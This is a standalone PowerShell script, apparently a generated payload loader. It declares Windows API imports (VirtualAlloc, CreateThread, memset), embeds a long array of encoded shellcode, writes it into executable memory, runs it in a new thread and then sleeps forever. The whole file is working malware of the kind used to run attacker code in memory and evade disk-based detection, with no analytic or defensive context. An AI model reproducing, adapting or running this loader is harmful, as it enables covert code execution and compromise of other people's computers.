$Ega = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $Ega -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0xfc,0x8f,0x41,0x1d,0xd9,0xc6,0xd9,0x74,0x24,0xf4,0x5b,0x33,0xc9,0xb1,0x47,0x31,0x43,0x13,0x83,0xc3,0x04,0x03,0x43,0xf3,0x6d,0xb4,0xe1,0xe3,0xf0,0x37,0x1a,0xf3,0x94,0xbe,0xff,0xc2,0x94,0xa5,0x74,0x74,0x25,0xad,0xd9,0x78,0xce,0xe3,0xc9,0x0b,0xa2,0x2b,0xfd,0xbc,0x09,0x0a,0x30,0x3d,0x21,0x6e,0x53,0xbd,0x38,0xa3,0xb3,0xfc,0xf2,0xb6,0xb2,0x39,0xee,0x3b,0xe6,0x92,0x64,0xe9,0x17,0x97,0x31,0x32,0x93,0xeb,0xd4,0x32,0x40,0xbb,0xd7,0x13,0xd7,0xb0,0x81,0xb3,0xd9,0x15,0xba,0xfd,0xc1,0x7a,0x87,0xb4,0x7a,0x48,0x73,0x47,0xab,0x81,0x7c,0xe4,0x92,0x2e,0x8f,0xf4,0xd3,0x88,0x70,0x83,0x2d,0xeb,0x0d,0x94,0xe9,0x96,0xc9,0x11,0xea,0x30,0x99,0x82,0xd6,0xc1,0x4e,0x54,0x9c,0xcd,0x3b,0x12,0xfa,0xd1,0xba,0xf7,0x70,0xed,0x37,0xf6,0x56,0x64,0x03,0xdd,0x72,0x2d,0xd7,0x7c,0x22,0x8b,0xb6,0x81,0x34,0x74,0x66,0x24,0x3e,0x98,0x73,0x55,0x1d,0xf4,0xb0,0x54,0x9e,0x04,0xdf,0xef,0xed,0x36,0x40,0x44,0x7a,0x7a,0x09,0x42,0x7d,0x7d,0x20,0x32,0x11,0x80,0xcb,0x43,0x3b,0x46,0x9f,0x13,0x53,0x6f,0xa0,0xff,0xa3,0x90,0x75,0x95,0xa6,0x06,0xb6,0xc2,0xa8,0x8d,0x5e,0x11,0xab,0x35,0x4d,0x9c,0x4d,0x65,0x21,0xcf,0xc1,0xc5,0x91,0xaf,0xb1,0xad,0xfb,0x3f,0xed,0xcd,0x03,0xea,0x86,0x67,0xec,0x43,0xfe,0x1f,0x95,0xc9,0x74,0xbe,0x5a,0xc4,0xf0,0x80,0xd1,0xeb,0x05,0x4e,0x12,0x81,0x15,0x26,0xd2,0xdc,0x44,0xe0,0xed,0xca,0xe3,0x0c,0x78,0xf1,0xa5,0x5b,0x14,0xfb,0x90,0xab,0xbb,0x04,0xf7,0xa0,0x72,0x91,0xb8,0xde,0x7a,0x75,0x39,0x1e,0x2d,0x1f,0x39,0x76,0x89,0x7b,0x6a,0x63,0xd6,0x51,0x1e,0x38,0x43,0x5a,0x77,0xed,0xc4,0x32,0x75,0xc8,0x23,0x9d,0x86,0x3f,0xb2,0xe1,0x50,0x79,0xc0,0x0b,0x61;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$GNd=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($GNd.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$GNd,0,0,0);for (;;){Start-sleep 60};